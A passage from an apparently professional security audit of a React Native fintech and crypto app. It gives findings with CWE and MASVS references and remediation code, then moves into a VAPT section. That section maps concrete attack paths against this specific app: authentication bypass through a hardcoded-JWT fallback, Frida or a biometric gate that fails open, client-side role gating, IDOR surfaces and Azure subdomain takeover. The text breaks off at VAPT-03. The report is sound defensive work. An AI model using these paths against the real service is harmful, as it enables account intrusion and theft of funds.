The `Info.plist` also declares **no `NSPinnedDomains`**, which is the [H-03](#h-03--no-certificate-pinning-on-either-platform) finding.

**Recommended fix.**
1. **Remove `NSAllowsLocalNetworking` from the release configuration.** Use per-configuration `Info.plist` values (via a build setting or a `#if DEBUG` preprocessor entry) so it applies only to Debug:
   ```xml
   <key>NSAppTransportSecurity</key>
   <dict>
     <key>NSAllowsArbitraryLoads</key><false/>
     <!-- NSAllowsLocalNetworking: Debug only -->
   </dict>
   ```
   In practice the simplest approach is an `Info-Debug.plist` / `Info-Release.plist` pair, or an `xcconfig`-driven `INFOPLIST_KEY_*` setting.
2. **Add `NSPinnedDomains`** per the [H-03 fix](#h-03--no-certificate-pinning-on-either-platform).
3. **Verify no other ATS exceptions creep in.** Add a CI check asserting the release `Info.plist` contains no `NSExceptionDomains`, no `NSAllowsArbitraryLoadsInWebContent`, and no `NSAllowsLocalNetworking`.

**Best practice.** ATS exceptions should be scoped to Debug configurations and audited on every release. Apple's App Review also scrutinises ATS exceptions, so removing unnecessary ones reduces review friction as well as risk.

---

### M-15 — No Session Inactivity Timeout or Foreground Re-Authentication

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-613 (Insufficient Session Expiration) |
| **MASVS** | MASVS-AUTH-2 |
| **Files** | [src/hooks/useTokenRefresh.tsx](src/hooks/useTokenRefresh.tsx), [App.tsx:77](App.tsx#L77) |

**Technical explanation.** The app maintains an indefinitely-renewing session with no inactivity handling:

- [`useTokenRefresh`](src/hooks/useTokenRefresh.tsx) schedules a `setTimeout` to refresh the access token 60 seconds before expiry, then **recursively reschedules** — indefinitely, for as long as the app process lives, regardless of user activity.
- `checkAndRefreshToken` uses the stored refresh token to mint a new access token with no user interaction.
- There is **no `AppState` listener** anywhere in the app that locks the session on background, and no inactivity timer.
- The biometric gate ([H-14](#h-14--biometric-gate-is-client-side-navigation-only)) runs only on the splash-screen path via `isOnboarding`, i.e. at cold start — not on resume.
- `SessionExpired` ([src/components/secessionExpired.tsx](src/components/secessionExpired.tsx)) is only shown reactively, when an API returns 401 and [`isErrorDispaly`](src/utils/helpers/index.tsx#L563) dispatches `isSessionExpired(true)`.

Net effect: a user who logs in once and leaves the app backgrounded remains authenticated indefinitely. Anyone who picks up the unlocked device and foregrounds the app is inside an authenticated session with access to balances, card details, and the withdrawal flow — with no biometric or PIN challenge.

There is also a **timer-leak concern** in `useTokenRefresh`: the recursive `scheduleTokenRefresh()` calls inside the `setTimeout` callback and in the immediate-refresh branch create new timers, and while `timeoutRef.current` is cleared at the top of each call, the recursive call in the `timeUntilRefresh <= 0` branch happens *before* the new timer is assigned — under rapid re-entry this could produce overlapping chains.

**Impact.**
- **Unauthorised access** on an unattended unlocked device — the highest-frequency real-world threat for a mobile banking app.
- **Non-compliance:** PCI-DSS Req. 8.2.8 requires re-authentication after 15 minutes of inactivity for systems in scope; PSD2 SCA expects periodic re-authentication.

**Recommended fix.**
1. **Add an inactivity lock:**
   ```tsx
   const INACTIVITY_MS = 5 * 60 * 1000;
   const backgroundedAt = useRef<number | null>(null);

   useEffect(() => {
     const sub = AppState.addEventListener("change", (state) => {
       if (state === "background" || state === "inactive") {
         backgroundedAt.current = Date.now();
       } else if (state === "active" && backgroundedAt.current) {
         if (Date.now() - backgroundedAt.current > INACTIVITY_MS) {
           requireBiometricReauth();     // per H-14: signature-based
         }
         backgroundedAt.current = null;
       }
     });
     return () => sub.remove();
   }, []);
   ```
2. **Add an absolute session lifetime.** Regardless of activity, force full re-authentication after e.g. 12 or 24 hours. Record the login timestamp and check it on resume.
3. **Stop the refresh chain when the session should end.** `useTokenRefresh` should not renew a session that has exceeded its absolute lifetime or that has been idle past the threshold.
4. **Uncomment the session-expiry dispatch** in `checkAndRefreshToken` ([M-04](#m-04--silent-error-swallowing-throughout-the-codebase)) so a revoked refresh token ends the session immediately.
5. **Clear sensitive state on background:** call `clearDecryptCache()` ([useEncryption_Decryption.tsx:70](src/hooks/useEncryption_Decryption.tsx#L70)) when backgrounding, so decrypted PII does not sit in memory while the app is not in use. The function exists and is currently only called on logout.
6. **Harden the timer logic** — assign `timeoutRef.current` before any recursive call, and guard against re-entry.

**Best practice.** Financial apps should combine: a short inactivity lock with biometric re-entry, an absolute session lifetime, immediate termination on refresh-token revocation, and clearing of decrypted data from memory on background. The session should be a server-side concept that the client reflects, not a client-side timer the server knows nothing about.

---

### M-16 — Excessive `console` Logging Across 20 Files

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-532 (Insertion of Sensitive Information into Log File) |
| **MASVS** | MASVS-STORAGE-2 |
| **Scope** | 20 files contain `console.*` calls |

**Technical explanation.** `console.log`, `console.error`, and `console.warn` appear across 20 source files, including in authentication paths:

```tsx
// src/screens/SplashScreen.tsx
console.log("No session found, user needs to login");
console.log("Calling getMemDetails with:", userDetails);      // ← logs fcmToken
console.log("User session restored successfully");
console.log("Failed to restore user session:", error);
console.log("Error clearing persisted state:", error);
console.error("Auth0 authorization failed:", e);
console.log("Using temporary login with provided JWT token");
console.log("Token expires at:", new Date(1758449065 * 1000).toISOString());
console.error("Temporary login failed:", e);
console.error("Fallback navigation failed:", fallbackError);
```
```js
// src/redux/Store/index.js  (dead module, but still)
console.log("Store with thunk middleware created successfully:", typeof store);
```
```tsx
// src/utils/helpers/encryptionTransfermation.tsx:81
console.error("Error retrieving secret key:", err);           // ← crypto path
```
```tsx
// App.tsx
console.error("Store is undefined! This will cause the app to crash.");
console.log("Error getting theme:", error);
```

In a **release** build with Hermes, `console.log` output is not stripped by default — it goes to the platform log (`logcat` on Android, `os_log` on iOS). On Android before API 16 any app could read the log; today `logcat` requires ADB or elevated privileges, which narrows exposure — but it remains readable via `adb logcat` on any device with USB debugging enabled, and by any diagnostic/OEM app with `READ_LOGS`.

The specific risk here is that the logged objects include structured data: `userDetails` (containing the FCM token), error objects that may embed request configuration, and — in `Login.tsx` ([H-13](#h-13--hardcoded-auth0-client-ids-and-a-dead-password-grant-login-screen)) — a `catch` that logs a fetch error from a request whose body contained the user's password.

There is also `LogBox` imported in [App.tsx:3](App.tsx#L3) but never configured (no `LogBox.ignoreAllLogs()`), which is fine but suggests incomplete cleanup.

**Recommended fix.**
1. **Strip console calls from release bundles** via Babel:
   ```js
   // babel.config.js
   module.exports = {
     presets: ["module:@react-native/babel-preset"],
     plugins: [
       ["module-resolver", { /* … */ }],
       "react-native-worklets/plugin",
     ],
     env: {
       production: {
         plugins: [["transform-remove-console", { exclude: ["error", "warn"] }]],
       },
     },
   };
   ```
   Note `react-native-worklets/plugin` must remain **last** in the plugin list — add the production plugin under `env.production` as shown, not to the main array.
2. **Replace ad-hoc logging with a scrubbed logger** that routes to Sentry breadcrumbs in production and to `console` only in `__DEV__`:
   ```ts
   export const log = {
     debug: (...a: any[]) => { if (__DEV__) console.log(...a); },
     error: (msg: string, e?: unknown) => {
       if (__DEV__) console.error(msg, e);
       Sentry.captureException(e, { tags: { msg } });     // scrubbed per C-07
     },
   };
   ```
3. **Remove the specific sensitive logs** in `SplashScreen.tsx` regardless of stripping — the "temporary login" logs go away with [C-04](#c-04--hardcoded-production-issuer-jwt-and-authentication-bypass-fallback).
4. **Add `no-console` to ESLint** with an allowance for the logger module only (see [L-06](#l-06--no-eslint-configuration-despite-a-lint-script)).
5. **Verify with a release build:** `adb logcat | grep -i exchangapay` after exercising login should produce nothing.

**Best practice.** Production builds should emit no `console` output. Use a single logging abstraction with severity levels, automatic scrubbing, and a `__DEV__` gate — so the decision about what reaches a log is made once, in one place, rather than at 100 call sites.

---

## 5. Low / Informational Findings

---

### L-01 — Dead Code and Abandoned Modules

| | |
|---|---|
| **Severity** | 🔵 **LOW** |
| **CWE** | CWE-561 (Dead Code) |

Several modules are unreferenced but present, each carrying latent risk:

| File | Status | Risk |
|---|---|---|
| [src/screens/Login/Login.tsx](src/screens/Login/Login.tsx) | Not in any navigator | Hardcoded client ID, ROPC pattern ([H-13](#h-13--hardcoded-auth0-client-ids-and-a-dead-password-grant-login-screen)) |
| [src/utils/auth.tsx](src/utils/auth.tsx) | No call sites | AsyncStorage token/key storage ([H-07](#h-07--auth-tokens-also-written-to-plaintext-asyncstorage)) |
| [src/utils/api.tsx](src/utils/api.tsx) | Partially used (`authApi`, `cardApi`) | 9 hardcoded base URLs incl. stale Azure hosts ([L-04](#l-04--stale-hardcoded-azure-and-third-party-api-endpoints)) |
| [src/redux/Store/index.js](src/redux/Store/index.js) | Superseded by [src/store/index.tsx](src/store/index.tsx) | Creates a **second Redux store** with `createStore` (deprecated); `console.log` on import |
| [src/redux/Reducer/index.js](src/redux/Reducer/index.js) | Unused root reducer | Duplicate reducer composition |
| [src/config/index.tsx](src/config/index.tsx) | Entirely commented out except `const waiting={yes:'yes, this functionality on hold'}` | Confusing; imports React for nothing |
| [src/screens/onBoarding/sumsub.tsx](src/screens/onBoarding/sumsub.tsx) (`FillSumsub`) | Placeholder screen rendering a logo and "Mobile verification" | Registered in AppContainer; dead UI |
| [src/utils/tools.js](src/utils/tools.js) `encryptForRegister` | No call sites | Static AES key ([C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption)) |
| [Environment.js](Environment.js) `getEnvVars` | Unused; references undefined `ENV.local` | Would return `undefined` if called |

**Recommendation.** Delete all of the above. Dead code that handles credentials, cryptography, or storage is the most common source of reintroduced vulnerabilities — a future developer sees an unused `Login` screen or an `auth.tsx` helper and wires it in, unaware of why it was abandoned. Version control preserves the history; the working tree should contain only live code. Add `ts-prune` or `knip` to CI to detect unreferenced exports.

---

### L-02 — Duplicated and Redundant Dependencies

| | |
|---|---|
| **Severity** | 🔵 **LOW** (bundle size, build time, maintenance) |

Eleven packages solve problems already solved by another installed package:

| Concern | Installed | Recommendation |
|---|---|---|
| Charting | `victory-native@36.9.2`, `react-native-chart-kit@6.12.3`, `react-native-wagmi-charts@2.1.0` | Pick **one**. `wagmi-charts` is the most modern for financial charts. Removing `victory-native` also clears the `d3-color` CVE. |
| Splash screen | `react-native-splash-screen@3.3.0`, `react-native-bootsplash@6.3.11` | Keep **bootsplash** (it is the one used in [App.tsx:35](App.tsx#L35)). Removing the other drops a pre-AndroidX dependency. |
| Push notifications | `react-native-push-notification@8.1.1`, `@react-native-community/push-notification-ios@1.11.0`, `@notifee/react-native@9.1.8` | Keep **notifee** + `@react-native-firebase/messaging`. Removing the others drops a patch file and a pre-AndroidX dependency. |
| Filesystem | `react-native-fs@2.20.0`, `react-native-blob-util@0.19.3` | Keep **blob-util** (more widely used in this codebase). |
| Signature capture | `react-native-signature-capture@0.4.12`, `react-native-signature-canvas@4.7.4` | Keep **signature-canvas**. Removing the other drops a pre-AndroidX dependency. |
| UI kit | `react-native-elements@3.4.3`, `@ui-kitten/components@5.3.1` | Keep **UI Kitten** (the theme system is built on it). |
| Bottom sheet | `@gorhom/bottom-sheet@4.4.5`, `react-native-raw-bottom-sheet@3.0.0`, `react-native-modal@14.0.0-rc.1` | Consolidate on **@gorhom/bottom-sheet**. Note `react-native-modal` is on an **`-rc` prerelease** — pin to a stable version. |
| Date/time | `moment@2.30.1` + `moment-timezone@0.6.0` (8 files), `dayjs` (7 files) | Keep **dayjs** (~2 KB vs ~70 KB for moment+tz). Moment is in maintenance mode. |
| Base64 | `base-64@1.0.0`, `react-native-quick-base64@3.0.1` | Keep **quick-base64** (native). `base-64` is used only for the `atob` polyfill. |
| Crypto | `crypto-js@4.2.0`, `react-native-quick-crypto@1.1.6` | Keep **quick-crypto**. `crypto-js` remains only in [chatService.js](src/services/chatService.js), which is being removed per [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript). |
| Unknown | `hooks@0.3.2` | A 2015 package with no discernible use — remove. |

**Impact.** Larger bundle and APK, longer builds, more native modules to keep compatible across RN upgrades, and a larger CVE surface. Removing the three pre-AndroidX libraries (`push-notification`, `signature-capture`, `splash-screen`) additionally allows `android.enableJetifier=false` — [gradle.properties](android/gradle.properties) documents these three as the exact reason Jetifier is retained.

**Recommendation.** Remove the redundant package in each row, one row per PR, with a smoke test after each. Prioritise the three that unblock Jetifier removal.

---

### L-03 — Committed Development Artefacts

| | |
|---|---|
| **Severity** | 🔵 **LOW** |

Files tracked in git that should not be:

```
.DS_Store
android/.DS_Store
ios/.DS_Store
ios/exchangapay.xcworkspace/xcuserdata/mandip.xcuserdatad/UserInterfaceState.xcuserstate
android/app/debug.keystore          ← also C-03
ios/sentry.properties               ← also C-02
```

`.DS_Store` files leak directory listings (including names of files that were later deleted). `UserInterfaceState.xcuserstate` is a per-developer Xcode UI state file that causes merge conflicts and leaks the developer's username (`mandip`).

Note `.gitignore` **already lists** `.DS_Store`, `ios/*.xcworkspace/xcuserdata/`, and `android/app/debug.keystore` — but `.gitignore` has no effect on files already tracked.

**Recommendation.**
```bash
git rm --cached .DS_Store android/.DS_Store ios/.DS_Store
git rm --cached -r ios/exchangapay.xcworkspace/xcuserdata
git rm --cached android/app/debug.keystore ios/sentry.properties
```
Then commit. For `debug.keystore` and `sentry.properties`, also purge from history (see [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository)/[C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)). Add a global gitignore for `.DS_Store` and a pre-commit hook to block it.

---

### L-04 — Stale Hardcoded Azure and Third-Party API Endpoints

| | |
|---|---|
| **Severity** | 🔵 **LOW** |
| **File** | [src/utils/api.tsx](src/utils/api.tsx) |

```ts
const transactionApi     = create({ baseURL: "https://neowalletgrid.azurewebsites.net/" });
const transactionBankApi = create({ baseURL: "https://neobank.azurewebsites.net/" });
const authApi            = create({ baseURL: "https://tstlogin.suissebase.io" });
const api                = create({ baseURL: "https://neowalletapi.azurewebsites.net/" });
const uploadapi          = create({ baseURL: "https://api.exchangapay.com/" });
const marketApi          = create({ baseURL: "https://api.coingecko.com/" });
const cardApi            = create({ baseURL: "https://api.exchangapay.com/" });
const coingico           = create({ baseURL: "https://api.coingecko.com/api/v3/" });
const memberInfoAPI      = "https://api.exchangapay.com/api/v1/Registration/App/Exchange";
```

Concerns:
1. **Naming suggests a predecessor product** (`neowallet`, `neobank`) — these appear to be legacy endpoints from an earlier system. `authApi` points at `tstlogin.suissebase.io`, a **different organisation's domain** entirely, and is used by [`AuthService.getAccountInfo`](src/services/auth.tsx#L6-L9).
2. **`*.azurewebsites.net` subdomain-takeover risk.** If any of these Azure App Services is deprovisioned while the client still points at it, an attacker can register the same subdomain name and receive the app's requests — including any credentials attached to them. This is a well-known Azure attack pattern.
3. **These bypass the environment configuration** entirely — they are literals, unaffected by `getAllEnvData`, so they cannot be pointed at a different environment.
4. **`cardApi` and `uploadapi` here hardcode `api.exchangapay.com` (production)** while `ApiService.ts` resolves to `tstapi.exchangapay.com` via [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build) — so the app talks to **both** environments simultaneously depending on which client a service module imports. `SecurityService.changePassword` uses `api` from this module (production), while other calls use `ApiService` (test).

That last point is significant: **password changes may be going to production while the session was established against test**, or vice versa. This should be verified urgently.

**Recommendation.**
1. **Audit which of these endpoints are still live and still used.** `transactionApi`, `transactionBankApi`, and `api` from this module appear largely unreferenced; `authApi`, `cardApi`, `coingico`, and `memberInfoAPI` are used.
2. **Delete unused clients.** Confirm the Azure App Services are either decommissioned *and removed from the client*, or still required.
3. **Move all live endpoints into `Environment.js`** so they are environment-selected.
4. **Consolidate onto the single `ApiService` axios instance** so timeouts, retries, interceptors, and pinning apply uniformly.
5. **Resolve the cross-environment mixing** — confirm whether `SecurityService.changePassword` is hitting production with a test-tenant token.

---

### L-05 — Minimal Test Coverage

| | |
|---|---|
| **Severity** | 🔵 **LOW** |

The entire test suite is one smoke test:

```tsx
// __tests__/App.test.tsx
test('renders correctly', async () => {
  await ReactTestRenderer.act(() => { ReactTestRenderer.create(<App />); });
});
```

with `jest.config.js` containing only `{ preset: 'react-native' }`. Per the deleted CI workflow's own comments, this test **fails** — `transformIgnorePatterns` does not cover the RN dependencies, so ESM in `node_modules` is never transpiled.

For a fintech app with ~53,000 LOC handling money movement, this is effectively no coverage. Notably untested: the encryption/decryption round-trip, the idempotency key derivation, `validateCryptoAddress` (which gates crypto withdrawals), `formatCurrency`/`toFixedNumber` (money arithmetic), the error-mapping in `isErrorDispaly`, and the token refresh scheduling.

**Recommendation.**
1. **Fix the Jest config** so the existing test passes:
   ```js
   module.exports = {
     preset: 'react-native',
     transformIgnorePatterns: [
       'node_modules/(?!(@react-native|react-native|@react-navigation|react-native-.*|@sentry|@notifee|@ui-kitten|@eva-design)/)',
     ],
     setupFiles: ['<rootDir>/jest.setup.js'],
   };
   ```
2. **Prioritise tests by risk**, not coverage percentage:
   - **Cryptography** — encrypt/decrypt round-trip, known-answer vectors from the backend, tamper detection (once [H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback) adds it), key-length validation.
   - **Money arithmetic** — `formatCurrency`, `toFixedNumber`, `commaSeparating`, `formatCoin` with edge cases (very large, very small, scientific notation).
   - **`validateCryptoAddress`** — this function currently **returns `true` for any network other than TRC-20 and Polygon** ([helpers/index.tsx:790-792](src/utils/helpers/index.tsx#L790-L792)), meaning BTC, ETH, and SOL addresses are **not validated at all** despite regexes existing for them. That is a genuine bug worth a test and a fix — a malformed BTC address would be accepted and funds could be lost.
   - **Idempotency key derivation** — including the duplicate-transaction case from [M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs).
   - **Error mapping** — `isErrorDispaly` for each status code.
3. **Add the security regression tests** recommended throughout this report (secret scanning, no-JWT-literals, ATS assertions).
4. **Restore CI** ([§13](#13-devops--cicd-security)) with these as blocking gates.

---

### L-06 — No ESLint Configuration Despite a Lint Script

| | |
|---|---|
| **Severity** | 🔵 **LOW** |

`package.json` defines `"lint": "eslint ."` and installs `eslint@^8.19.0` plus `@react-native/eslint-config@0.83.6` — but **no `.eslintrc*` or `eslint.config.js` exists anywhere in the repository**. The lint script therefore fails or lints nothing. The deleted CI workflow's comments confirm this: *"lint → eslint 8 is installed but no .eslintrc exists anywhere."*

This is the root cause of several findings in this report that a linter would have caught:
- [M-01](#m-01--getuserinfo-is-never-awaited-in-the-error-interceptor) — `no-floating-promises`
- [M-04](#m-04--silent-error-swallowing-throughout-the-codebase) — `no-empty` with `allowEmptyCatch: false`
- [M-16](#m-16--excessive-console-logging-across-20-files) — `no-console`
- [L-01](#l-01--dead-code-and-abandoned-modules) — `no-unused-vars` / `ts-prune`
- The 1,081 `: any` annotations — `@typescript-eslint/no-explicit-any`

**Recommendation.** Create `.eslintrc.js`:
```js
module.exports = {
  root: true,
  extends: ['@react-native', 'plugin:@typescript-eslint/recommended-requiring-type-checking'],
  parserOptions: { project: './tsconfig.json' },
  rules: {
    'no-console': ['error', { allow: [] }],
    'no-empty': ['error', { allowEmptyCatch: false }],
    '@typescript-eslint/no-floating-promises': 'error',
    '@typescript-eslint/no-misused-promises': 'error',
    '@typescript-eslint/no-explicit-any': 'warn',
    'react-hooks/exhaustive-deps': 'warn',
  },
};
```
Expect a large number of initial violations. Introduce incrementally: start with `no-empty`, `no-floating-promises`, and `no-console` as errors; leave `no-explicit-any` as a warning with a plan to reduce it. Add lint as a blocking CI gate once the baseline is clean.

---

### L-07 — TypeScript Strictness Not Enforced

| | |
|---|---|
| **Severity** | 🔵 **LOW** |

`tsconfig.json` extends `@react-native/typescript-config` (which enables `strict: true`) but the codebase contains **1,081 `: any` annotations**, systematically defeating it. Per the deleted CI workflow, `npx tsc --noEmit` produces **~17 errors** — missing `@types/lodash`, `@types/numeral`, and implicit-any index signatures.

Representative security-relevant cases where `any` masked a real bug:
- [M-01](#m-01--getuserinfo-is-never-awaited-in-the-error-interceptor): `const userInfo: any = getUserInfo();` — `any` hides that this is a Promise.
- [ApiService.ts:71](src/utils/ApiService.ts#L71): `(error: any)` throughout the error path.
- [encryptionTransfermation.tsx:89](src/utils/helpers/encryptionTransfermation.tsx#L89): `const KEY: any = await getSecretKey();` then `KEY.sk` — `getSecretKey` is annotated `Promise<string | null>` but returns an object, so the annotation is wrong and `any` hides it.
- Navigation props are almost universally `(props: any)`, so route params are unchecked despite [navigation-types.ts](src/navigation/navigation-types.ts) existing.

**Recommendation.**
1. Install the missing type packages: `npm i -D @types/lodash @types/numeral`.
2. Fix the ~17 existing `tsc --noEmit` errors and make it a blocking CI gate.
3. Reduce `any` incrementally, prioritising: the API/service layer (where response shapes matter), the crypto helpers, and Redux state. Define proper interfaces for `userInfo`, API responses, and navigation params.
4. Use the existing `RootStackParamList` in [navigation-types.ts](src/navigation/navigation-types.ts) to type screen props instead of `any`.

---

### L-08 — Oversized Components and Inconsistent Naming

| | |
|---|---|
| **Severity** | 🔵 **LOW** |

**File sizes** (top offenders):

| File | Lines |
|---|---|
| [src/screens/Profile/addKycInfomation.tsx](src/screens/Profile/addKycInfomation.tsx) | 2,212 |
| [src/screens/cards/kycAddress.tsx](src/screens/cards/kycAddress.tsx) | 2,193 |
| [src/screens/Profile/editprofile.tsx](src/screens/Profile/editprofile.tsx) | 1,824 |
| [src/components/DrawerMenu.tsx](src/components/DrawerMenu.tsx) | 880 |
| [src/screens/Crypto/sendCryptoDetails.tsx](src/screens/Crypto/sendCryptoDetails.tsx) | 874 |
| [src/screens/Tlv_Cards/CardBalance.tsx](src/screens/Tlv_Cards/CardBalance.tsx) | 871 |

Components of 2,000+ lines cannot be reasoned about reliably — which is directly relevant to security, since `sendCryptoDetails.tsx` (the withdrawal flow, containing the WebView issue in [H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow)) is 874 lines mixing UI, API calls, validation, and 2FA handling.

**Naming inconsistencies** are pervasive and make search/review harder:
- Misspellings in filenames: `rigistration.tsx`, `rigistrationReferral.tsx`, `rigistationSchema.tsx`, `addKycInfomation.tsx`, `secessionExpired.tsx`, `SendCryptoSuccessNavigatot.tsx`, `PdfExcelComponentNavigatot.tsx`, `caseMangement/`
- Misspellings in identifiers: `useChekBio`, `SumsubCompnent`, `isLocedModelOpen`, `sendAmmount`, `errormsg`/`setErrormsg`, `isApitriggerd`, `supportMessgaeCount`, `looading`, `handleLgout`, `sentryEnvornment`, `sentryLoggs`, `isErrorDispaly`, `DRAWER_CONSTATNTS`
- Mixed casing conventions for files: `PascalCase.tsx`, `camelCase.tsx`, and `lowercase.tsx` all present in the same directories.
- Two parallel state-management idioms: modern RTK slices in [src/store/](src/store/) alongside legacy action-types/reducers in [src/redux/](src/redux/), with the legacy `UserReducer` being the one that actually holds the critical state.

**Recommendation.** Not urgent, but worth scheduling: split the 2,000-line screens into container + presentational components with extracted hooks for the API logic; standardise on `PascalCase` for components and `camelCase` for utilities; fix the misspellings in a single mechanical rename PR (low risk, high readability gain). Consolidate the two Redux idioms onto RTK — the split is the reason `userInfo` lives in a legacy reducer while `auth` lives in a slice, which is confusing and has security consequences (it is why the persist whitelist covers `UserReducer`).

---

### L-09 — Miscellaneous Observations

| | |
|---|---|
| **Severity** | 🔵 **INFORMATIONAL** |

1. **`validateCryptoAddress` does not validate most networks.** [helpers/index.tsx:769-804](src/utils/helpers/index.tsx#L769-L804) returns `true` for any network that is not TRC-20 or Polygon, despite having regexes for BTC, ERC-20, and SOL. A malformed BTC or ETH withdrawal address would pass validation. **This is a genuine funds-loss risk** and should be fixed — it is listed here rather than as a High finding only because it is a correctness bug rather than an attacker-controlled vulnerability, but it deserves priority.

2. **`const ENV = "tst"` selects mainnet address regexes.** [helpers/index.tsx:728-760](src/utils/helpers/index.tsx#L728-L760) — `ENV === "tst" || ENV === "prod" ? mainnetAddressRegex : testnetAddressRegex`. So a test-environment build validates against mainnet addresses. Combined with [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build), real mainnet addresses are accepted against a test backend.

3. **`Buffer` polyfill assignment.** [helpers/index.tsx:317-319](src/utils/helpers/index.tsx#L317-L319) assigns `global.atob` from `base-64`. Fine, but `react-native-quick-base64` provides a faster native implementation and is already installed.

4. **`patch-package` patches three libraries.** [patches/](patches/) contains patches for `react-native-push-notification`, `react-native-screens`, and `@react-native-cookies/cookies`. These must be re-verified on every dependency bump. Removing `react-native-push-notification` ([L-02](#l-02--duplicated-and-redundant-dependencies)) eliminates one.

5. **`react-native-modal@14.0.0-rc.1`** is a release candidate pinned in production dependencies. Move to a stable release.

6. **`__DEV__` is used inconsistently.** `getEnvVars` uses it (but is dead code); `Sumsub .withDebug(true)` does not ([M-09](#m-09--sumsub-kyc-sdk-initialised-with-debug-mode-enabled)); logging does not ([M-16](#m-16--excessive-console-logging-across-20-files)).

7. **`store` null-checks in App.tsx.** [App.tsx:69-72](App.tsx#L69-L72) and [:161-164](App.tsx#L161-L164) check `if (!store)` — a statically-imported module binding that cannot be undefined. Defensive code that suggests a past debugging session; harmless but confusing.

8. **`RN_UPGRADE_0.83.md`** (27 KB) is a detailed and genuinely useful upgrade log. Worth keeping, but consider moving to `docs/`.

9. **No `SECURITY.md` or documented vulnerability-disclosure process.** For a fintech app, a published security contact and disclosure policy is expected.

10. **iOS `UISupportedInterfaceOrientations` allows landscape** while the app appears designed for portrait — worth confirming intentional, as landscape layouts are likely untested.

---
## 6. VAPT Assessment

This section reframes the findings as an attacker would approach them — by objective rather than by control. Each entry states the attack, its feasibility against *this* application, and the specific evidence supporting the assessment.

### Attack Surface Summary

| Surface | Exposure | Primary weaknesses |
|---|---|---|
| **Binary** | Public (any APK/IPA) | No obfuscation (C-08), debug-signed (C-03), secrets in bundle (C-01/C-04/C-06) |
| **Network** | Any shared network | No pinning (H-03), config not applied (H-02), spoofable IP header (M-10) |
| **Device storage** | Rooted/stolen/backup | Weak Keychain options (H-11), unencrypted persist (H-05), public downloads (M-07) |
| **Runtime** | Rooted device | No RASP/root detection (H-04), client-side auth gates (C-04/H-14) |
| **Push channel** | FCM sender ID public | Path traversal in handler (M-05), no App Check (H-15) |
| **WebView** | 2FA withdrawal flow | No origin allow-list, token sent to dynamic URL (H-10) |
| **Third parties** | Kommo, Sentry, Crashlytics, ipinfo.io, CoinGecko, Sumsub | Leaked HMAC secret (C-01), leaked Sentry token (C-02), token/PII in telemetry (C-07) |

---

### VAPT-01 — Authentication Bypass

**Severity:** 🔴 Critical · **Feasibility:** High · **Evidence:** [C-04](#c-04--hardcoded-production-issuer-jwt-and-authentication-bypass-fallback), [H-14](#h-14--biometric-gate-is-client-side-navigation-only), [C-08](#c-08--proguardr8-disabled-no-code-obfuscation)

**Attack path.** Three independent routes reach an authenticated UI state without valid credentials:

1. **The `onTempLoginPress` function** ([SplashScreen.tsx:175](src/screens/SplashScreen.tsx#L175)) uses a hardcoded JWT and, on failure, **fabricates a fully-approved user object and navigates to the Dashboard**. If bound to any control — or invoked via Frida — this is a one-step bypass.
2. **The biometric gate returns to Dashboard when no sensor is available** ([useCheckBio.tsx:46-53](src/hooks/useCheckBio.tsx#L46-L53)). Disabling biometrics in device settings bypasses the app lock entirely, no tooling required.
3. **Redux state manipulation.** All gating (`isKYC`, `customerState`, `role`, `isEmailVerified`) is read from `state.UserReducer.userInfo` and enforced only as navigation decisions in [`getMemDetails`](src/hooks/useMemberLogin.tsx#L88-L180). Hooking the store or patching the bundle grants Dashboard access.

**What this does *not* establish.** Client-side bypass grants UI access; whether it grants *transactional* access depends entirely on backend enforcement. **This must be verified server-side** — the client provides no evidence either way.

**Risk impact.** Unauthorised access to account UI; potential unauthorised transactions if the backend trusts client-asserted state; AML/KYC control circumvention.

**Remediation.** Delete `onTempLoginPress`; fail closed in `useCheckBio`; move all KYC/role/state enforcement to server-side checks on every financial endpoint; implement signature-based biometrics ([H-14](#h-14--biometric-gate-is-client-side-navigation-only)).

---

### VAPT-02 — Authorisation Bypass / Privilege Escalation

**Severity:** 🟠 High · **Feasibility:** Medium (depends on backend) · **Evidence:** [C-04](#c-04--hardcoded-production-issuer-jwt-and-authentication-bypass-fallback), [H-13](#h-13--hardcoded-auth0-client-ids-and-a-dead-password-grant-login-screen)

**Attack path.**
1. **Role gating is client-side.** `if (userDetails?.role !== "Customer")` → navigate to `actionRestricted` ([useMemberLogin.tsx:106](src/hooks/useMemberLogin.tsx#L106)). A patched client simply does not navigate. If a non-Customer role (admin, support) exists and the backend authorises by token claims rather than re-checking, this is a privilege-escalation vector.
2. **Account state gating is client-side.** `accountStatus === "Inactive"` renders a banner ([AppContainer.tsx:170](src/navigation/AppContainer.tsx#L170)) but does not block any action.
3. **The Management API audience** in the dead `Login.tsx` (`https://exchangapay.us.auth0.com/api/v2/`) — if that client has Management API scopes, a token for it permits tenant-level user operations.
4. **IDOR surface.** Several endpoints take client-supplied identifiers: `sumsubAccessToken(userInfo.userId, kycLevel)` ([sumsub.tsx:84](src/components/sumsub.tsx#L84)), `getcardPin(body)` ([CardDetails.tsx:189](src/screens/Tlv_Cards/CardDetails.tsx#L189)), Kommo `conversation_id` = customer id ([chatService.js:192](src/services/chatService.js#L192)). Each must be verified to resolve identity from the token server-side, not from the parameter.

**Risk impact.** Cross-account data access if any endpoint trusts a client-supplied ID; role escalation if role checks are client-only.

**Remediation.** Server-side authorisation on every endpoint, deriving identity from the bearer token's `sub`. Penetration-test each identifier-taking endpoint with another user's ID. Audit the Auth0 Management API client per [H-13](#h-13--hardcoded-auth0-client-ids-and-a-dead-password-grant-login-screen).

---

### VAPT-03 — API Abuse

**Severity:** 🟡 Medium · **Feasibility:** High · **Evidence:** [M-11](#m-11--no-client-side-rate-limiting-fixed-interval-chat-polling), [M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs), [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript)

**Attack path.**
